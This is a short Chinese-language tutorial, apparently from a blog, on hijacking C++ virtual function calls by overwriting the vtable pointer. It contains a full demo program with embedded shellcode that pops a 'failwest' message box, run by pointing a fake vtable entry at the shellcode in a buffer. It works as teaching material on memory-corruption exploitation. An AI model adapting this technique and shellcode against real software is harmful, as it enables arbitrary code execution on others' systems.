---


---

<h1 id="攻擊c虛函數">攻擊C++虛函數</h1>
<hr>
<h3 id="其實很簡單">其實很簡單</h3>
<p>1.區域變數上方有一個指針:<br>
我們稱他為P_vtable</p>
<p>2.P_vtable 指向了 vtable</p>
<p>3.vtable 上面儲存了虛函數的地址，(可能不只一個)</p>
<p><img src="https://i.imgur.com/52hbejx.png" alt="enter image description here"></p>
<h3 id="執行虛擬函數動作">執行虛擬函數動作</h3>
<p>1.找到虛表指針 p_vtable<br>
2.跑去 vtable 搜索 函數表<br>
3.找到適合的函數並呼叫</p>
<h2 id="只要能修改虛表指針就能造成風險">只要能修改虛表指針就能造成風險</h2>
<pre><code>#include "windows.h"
#include "iostream.h"
#include "stdio.h"

char shellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xfc\x9b\x42\x00";

class Failwest
{
public:
	char buf[200];
	virtual void test(void)
	{
		cout&lt;&lt;"Class Vtable::test()"&lt;&lt;endl;
	}
};
Failwest overflow, *p;
main(void)
{
	char * p_vtable;
	p_vtable=overflow.buf-4;//point to virtual table
	//__asm int 3
	//reset fake virtual table to 0x004088cc
	//the address may need to ajusted via runtime debug
	p_vtable[0]=0xc4;
	p_vtable[1]=0x9c;
	p_vtable[2]=0x42;
	p_vtable[3]=0x00;
	strcpy(overflow.buf,shellcode);//set fake virtual function pointer
	p=&amp;overflow;
	
	printf("%p\n",overflow.buf);
	
	p-&gt;test();
}

</code></pre>
<hr>
<h2 id="注意">注意</h2>
<h3 id="本例使用了手動修改-虛表指針-p_vtable-並不是靠溢出達成的">1.本例使用了手動修改 虛表指針 (p_vtable) 並不是靠溢出達成的</h3>
<h3 id="修改虛表指針後會跑去錯誤的-vtable-搜尋函數">2.修改虛表指針後會跑去錯誤的 vtable 搜尋函數</h3>
<h3 id="把-vtable-上面的第一個-函數地址-改成-shellcode-地址">3.把 vtable 上面的第一個 函數地址 改成 shellcode 地址</h3>
<h3 id="另外，本例根本不需要溢出buf-200，只是好玩，其實只需修改虛表指針，在安排一下vtable中的函數地址-改成-shellcode地址，就可以了。">另外，本例根本不需要溢出buf [200]，只是好玩，其實只需修改虛表指針，在安排一下vtable中的函數地址 改成 shellcode地址，就可以了。</h3>
<p><img src="https://i.imgur.com/e0WX0Hl.jpg" alt="enter image description here"></p>
<h3 id="成功">成功</h3>
<p><img src="https://i.imgur.com/Ki1lE82.png" alt="enter image description here"></p>
<h3 id="實際案例可能要溢出到別的區域中的虛表指針，或是其他方法修改，如下方。">實際案例可能要溢出到別的區域中的虛表指針，或是其他方法修改，如下方。</h3>
<p><img src="https://i.imgur.com/EVs6PnD.png" alt="enter image description here"></p>

